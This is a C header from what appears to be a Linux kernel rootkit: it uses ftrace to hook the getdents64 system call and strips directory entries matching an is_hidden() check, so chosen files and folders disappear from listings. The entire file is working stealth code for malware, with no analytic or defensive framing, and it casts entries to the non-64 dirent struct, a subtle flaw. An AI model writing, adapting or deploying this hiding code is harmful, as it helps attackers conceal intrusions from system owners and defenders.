/*
 * hooks_getdents64.h - getdents64 hook 实现
 * 用于隐藏文件/目录
 */

#pragma once

#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/string.h>

#include "ftrace_helper.h"
#include "hook.h"

#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*orig_sys_getdents64)(const struct pt_regs *regs);

static asmlinkage int hook_sys_getdents64(const struct pt_regs *regs)
{
    struct linux_dirent __user *dirent = (void __user *)regs->si;
    int res;

    res = orig_sys_getdents64(regs);
    if (res <= 0)
        return res;

    unsigned long off = 0;
    struct linux_dirent *kdirent, *kdir, *prev = NULL;

    kdirent = kmalloc(res, GFP_KERNEL);
    if (!kdirent)
        return res;

    if (copy_from_user(kdirent, dirent, res)) {
        kfree(kdirent);
        return res;
    }

    while (off < res) {
        kdir = (void *)kdirent + off;

        if (!is_hidden(kdir->d_name, false)) {
            prev = kdir;
        } else {
            if (kdir == kdirent) {
                res -= kdir->d_reclen;
                memmove(kdir, (void *)kdir + kdir->d_reclen, res);
                continue;
            }
            prev->d_reclen += kdir->d_reclen;
        }
        off += kdir->d_reclen;
    }

    if (copy_to_user(dirent, kdirent, res))
        res = -EFAULT;

    kfree(kdirent);
    return res;
}
#else
static asmlinkage long (*orig_sys_getdents64)(unsigned int fd,
    struct linux_dirent __user *dirent, unsigned int count);

static asmlinkage int hook_sys_getdents64(unsigned int fd,
    struct linux_dirent __user *dirent, unsigned int count)
{
    int res;

    res = orig_sys_getdents64(fd, dirent, count);
    if (res <= 0)
        return res;

    unsigned long off = 0;
    struct linux_dirent *kdirent, *kdir, *prev = NULL;

    kdirent = kmalloc(res, GFP_KERNEL);
    if (!kdirent)
        return res;

    if (copy_from_user(kdirent, dirent, res)) {
        kfree(kdirent);
        return res;
    }

    while (off < res) {
        kdir = (void *)kdirent + off;

        if (!is_hidden(kdir->d_name, false)) {
            prev = kdir;
        } else {
            if (kdir == kdirent) {
                res -= kdir->d_reclen;
                memmove(kdir, (void *)kdir + kdir->d_reclen, res);
                continue;
            }
            prev->d_reclen += kdir->d_reclen;
        }
        off += kdir->d_reclen;
    }

    if (copy_to_user(dirent, kdirent, res))
        res = -EFAULT;

    kfree(kdirent);
    return res;
}
#endif

static struct ftrace_hook syscall_hooks[] = {
    HOOK("sys_getdents64", hook_sys_getdents64, &orig_sys_getdents64),
};
